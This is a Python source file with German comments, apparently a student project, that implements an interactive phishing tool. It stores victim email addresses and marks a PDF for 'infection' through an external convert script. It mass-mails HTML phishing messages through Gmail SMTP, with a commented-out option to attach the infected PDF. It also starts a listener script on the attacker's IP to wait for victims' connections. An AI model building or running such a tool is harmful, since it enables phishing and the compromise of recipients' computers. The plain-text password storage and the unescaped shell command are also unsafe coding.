import os
from posix import write
import smtplib
import subprocess
import shutil
from pathlib import Path
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from colorama.initialise import reset_all
from configparser import ConfigParser
from colorama import Fore
from colorama import Style
import socket
import base64
# tvqh chzt egje sxsc
cfg = ConfigParser() # definiert "cfg" als Objekt der Klasse ConfigParser --> übernimmt die Eigenschaften
cfg.read("cfg.ini") # und kann jetzt KOnfigurationsdateien auslesen

def getIp():
    try: # Anwendung von try-except: bietet Möglichkeit nach Fehlermeldung den Code weiterlaufen zu lassen; wichtig fürs Debugging
        cfg["general"]["ip"] = socket.gethostbyname(socket.gethostname()) # verewndet socket Modul um die aktuelle Ipv4 Adresse des Rechners in Erfahrung zu bringen
    except socket.gaierror: # Falls Fehlermeldung muss der User seine IPv4 Adresse selbstständig eingeben
        print(f"{Fore.RED}Error:{Style.RESET_ALL}There was an error resolving the hostname.") # Fehlermeldung
        cfg["general"]["ip"] = input("Enter your ipv4 address: ") # User muss IPv4 Adresse selbstständig angeben
    except Exception as e: # Falls Fehlermeldung muss der User seine IPv4 Adresse selbstständig eingeben
        print(f"{Fore.RED}Error:{Style.RESET_ALL}unexpected error ocurred: {e}") # Fehlermeldung
        cfg["general"]["ip"] = input("Enter your ipv4 address: ") # User muss IPv4 Adresse selbstständig angeben

def checkfiles(direc) -> list: # erstellen einer Funktion die ein Argument "direc" braucht und einen Array auch Liste zurückgibt
    subprocess.run(f"ls {direc} > data/storage.txt", shell=True) # Nutzen von Subprocess um ein Command-Line Befehl auszuführen
    # "ls" listet alle Dateien in einem Verzeichnis auf; ">" fügt Ausgabe in Datei ein
    files = open("data/storage.txt", "r").readlines() # öffnet die Datei dann und liest sie aus; speichert alle Dateien im angebenen Verzeichnus in "files"
    for file in files: # for schleife; geht jedes Element in "files" durch
        file.removesuffix("\n") # entfernt von jedem Element das MItbringsel "\n" kommt von auslesen und repräsentiert eine neue Zeile
    return files # Gibt bereinigt alle Dateien im angebenen Verzeichnis aus

def cfgUpdate(): # Funktion oder Rückgabewert und Argumente
    with open('cfg.ini', 'w') as configfile: # öffnet die Konfigurationsdatei
        cfg.write(configfile) # und überschreibt dabei alles

def quit(cmd): # Funktion mit Argument, welches aber nicht gebraucht wird. Dadurch das die Funktion durch die dynamische Command-Line aktiviert wird
               # muss die Funktion das Argument aufnehmen können, sonst Fehlermeldung und der Code wird beendet
    exit(0) # beendet den Python Code ohne Fehlermeldung

def setmail(cmd): # Funktion die den cmd Array als Argument hat und die Opferemails speichert
    emails = cmd[1].split(";") # teilt den geteilten input am ";" nochmal; wenn mehrere Emails angebenen werden ist es notwendig diese zu separierien
    for email in emails: # loopt nun durch die einzelnen angebenen Emails
        if "@" in email: # guckt nach Richtigkeit der Emails um spätere Fehlercodes zu vermeiden
            cfg["mails"][email] = email # wenn richtig dann wird in der KOnfigurationsdatei in der Sektion "mails" ein neuer Eintrag gemacht
            cfgUpdate() # siehe Zeilen 39 - 41
            print(f"{Fore.GREEN}Success:{Style.RESET_ALL} set {Fore.BLUE}{email}{Style.RESET_ALL} as a mail") # success Meldung
        else: # wenn falsche Email:
            print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{email}{Style.RESET_ALL} is not a regular email address") # Fehlermeldung

def showmail(cmd): # Funktion die den cmd Array als Argument hat und alle gespeicherten Opferemails
    for mail in cfg["mails"]: # loopt durch die Einzelnen mails welche in Konfigurationsdatei gespeichert sind
        print(mail) # gibt alle gespeicherten Mails aus

def removemail(cmd): # Funktion die den cmd Array als Argument hat und die gespeicherten Opferemails wieder löschen kann
    for mail in cfg["mails"]: # loopt durch die Einzelnen mails welche in Konfigurationsdatei gespeichert sind
        if cmd[1] == "all": # wenn der zweite geteilte Befehl "all" entspricht dann
            cfg.remove_option("mails", mail) # wird der Eintrag in der KOnfigurationsdatei unabhängig vom Namen gelöscht
            print(f"{Fore.GREEN}Success:{Style.RESET_ALL} {Fore.BLUE}{mail}{Style.RESET_ALL} is removed") # success Meldung
            cfgUpdate() # siehe Zeilen 39 - 41
        elif mail == cmd[1]: # wenn die zu löschende Email (cmd[1]) tatsächlch gespeichert ist wird der Eintrag gelöscht
            cfg.remove_option("mails", mail) # Löschung des Eintrages
            print(f"{Fore.GREEN}Success:{Style.RESET_ALL} {Fore.BLUE}{mail}{Style.RESET_ALL} is removed") # success Meldung
            cfgUpdate() # siehe Zeilen 39 - 41

def setpdf(cmd): # Funktion, nimmt cmd-Array, dient der Aufnahme der zu infizieren PDF Datei
    future = checkfiles("futures") # siehe Z. 31 - 37
    if checkfiles("futures") == []: # damit das Tool übersichtlich und bequem bleibt kann man nur eine PDF gleichzeitig gepseichert haben
                                    # wenn "future" nicht leer ist heißt es das eine PDF bereits gesetzt wurde
        try: # try-except Konzept (siehe Kommentar Z. 22)
            if cmd[1].endswith(".pdf") == True: # guckt ob angegebene Datei wirklich eine PDF ist
                try: #
                    shutil.copyfile(cmd[1], "futures/" + Path(cmd[1]).stem + ".pdf") # wenn Datei PDF ist dann wird sie vom angebenen Pfad in in den
                                                                                     # Ordner "futures" kopiert
                    print(f"{Fore.GREEN}Success:{Style.RESET_ALL} {Fore.BLUE}{cmd[1]}{Style.RESET_ALL} gonna be a future evil pdf") # success Meldung
                except:
                    print(f"{Fore.RED}Error:{Style.RESET_ALL} There is no such file / directory: {Fore.BLUE}{cmd[1]}{Style.RESET_ALL}") # Fehlermeldung
            else:
                print(f"{Fore.RED}Error:{Style.RESET_ALL} Wrong input-file: {Fore.BLUE}{cmd[1]}{Style.RESET_ALL} is not a PDF!") # Fehlermeldung
        except:
            print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{cmd[0]}:{Style.RESET_ALL} no input is set") # Fehlermeldung
    else:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{future[0]}:{Style.RESET_ALL} is already set as a pdf.") # Fehlermeldung

def removepdf(cmd): # Funktion, nimmt cmd-Array, soll bestehende PDFs löschen
    try:
        try:
            os.remove(f"futures/{cmd[1]}") # Versucht angebenene PDF (cmd[1]) zu löschen
            print(f"{Fore.RED}Succes:{Style.RESET_ALL} {Fore.BLUE}{cmd[1]}{Style.RESET_ALL} is removed") # success Meldung
        except:
            print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{cmd[1]}{Style.RESET_ALL} is not a stored pdf") # Fehlermeldung
    except:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{cmd[0]}:{Style.RESET_ALL} no input is set") # Fehlermeldung

def showpdf(cmd): # Funktion, nimmt cmd-Array, soll die bestehende PDF anzeigen
    pdfs = checkfiles("futures") # siehe Z. 31 - 37
    if pdfs != []: # wird nur angezeigt wenn irgendeine PDF vorhanden ist
        for pdf in pdfs:
            if pdf.removesuffix("\n") != "": # wird nur angezeigt wenn Name der PDF nicht leer ist
                print(pdf.removesuffix("\n")) # gibt Namen der PDF aus
    else:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{cmd[0]}:{Style.RESET_ALL} no pdf is set") # Fehlermeldung

def infect(cmd): # Funktion, nimmt cmd-Array, infiziert PDF mit Virus
    subprocess.call(["script/convert.sh", checkfiles("futures")[0]]) # callt shell script "convert.sh", gibt "checkfiles("futures")[0]" als Argument

def sendmail(cmd): # Funktion, nimmt cmd-Array, versendet Mail; siehe Moodle
    subject = "Phishing Mail"
    sender_email = cfg["general"]["add"]
    password = cfg["general"]["passw"]
    evilpdf = checkfiles("evils")[0] # siehe Z. 31 - 37

    message = MIMEMultipart()
    message["Subject"] = subject

    # html = open("script/index.html").read().format(link=f"https://{config["general"]["ip"]}/{evilpdf}")
    html = open("html/template.html").read()
    message.attach(MIMEText(html, 'html'))

    # wenn dieser Teil auskommentiert wird dann verschickt es die evilPdf im Anhang

    # with open(evilpdf, "rb") as attachment:
    #     part = MIMEBase("application", "octet-stream")
    #     part.set_payload(attachment.read())

    # encoders.encode_base64(part)

    # part.add_header(
    #     "Content-Disposition",
    #     f"attachment; filename= {evilpdf}",
    # )
    # message.attach(part)

    text = message.as_string()

    emails = [] # erstellt leeren Array der alle Emails aus Konfigurationsdatei sammelt
    for mail in cfg["mails"]: # ruft alle Mails ab
        emails.append(mail) # fügt jede dem leeren Array hinzu

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, password)
        for email in emails: # verschickt für jede einzelne Email Adresse eine Email
            server.sendmail(sender_email, email, text)
            print(f"{Fore.GREEN}Success:{Style.RESET_ALL} send an evil email to {Fore.BLUE}{email}{Style.RESET_ALL}") # succes Meldung

def listen(cmd): # Funktion, nimmt cmd-Array, wartet auf eingehende Verbindungen
    pdf = checkfiles("evils")[0] # siehe Z. 31 - 37
    try:
        subprocess.call(["script/startsession.sh", cfg["general"]["ip"]]) # startet shell script "startsession.sh"
                                                                          # und übergibt Argument cfg["general"]["ip"]
    except:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} there is no evil PDF to host") # Fehlermeldung

cmds = { # Dictionary das alle Befehle zuordnet, siehe Moodle
    "setmail": setmail,
    "sendmail": sendmail,
    "setpdf": setpdf,
    "infect": infect,
    "exit": quit,
    "showmail": showmail,
    "listen": listen,
    "removemail": removemail,
    "removepdf": removepdf,
    "showpdf": showpdf,
}

if __name__ == "__main__": # gängiger Standard in Pythonentwicklung: nur folgender Code wird ausgeführt; sonst evtl. Selbstaktivierung von importierten Modulen
    if input("configure? y/n ") == "y": # fragt User nach evtl. Neu-Konfiguration
        cfg["general"]["add"] = input("email: ") # speichert Email Adresse in Konfigurationsdatei, sektion "general" unter dem key "mail"
        cfg["general"]["passw"] = input("password: ") # speichert Passwort in Konfigurationsdatei, sektion "general" unter dem key "passw"
        getIp() # führt die oben definierte Funktion getIp() aus und speichert die aktuelle IPv4 Adresse in der Konfigurationsdatei
        cfgUpdate() # überschreibt alle Änderungen der Konfigurationsdatei über die alten Einstellungen

    while True: # dynamische Command-Line; generelles Konzept ist auf Moodle erklärt
        cmd = input(": ").split(" ") # teilt input nach dem Leerzeichen, cmd ist nun ein array
        if cmd[0] in cmds:
            cmds[cmd[0]](cmd)
        else: # falls ein falscher Befehl eingeben wurde erscheint Fehlermeldung;danach kommt wieder die Befehlabfrage
            print(f"{Fore.RED}Error:{Style.RESET_ALL} wrong command: {Fore.BLUE}{cmd[0]}{Style.RESET_ALL}") # ich habe hier mit Farben gearbeitet
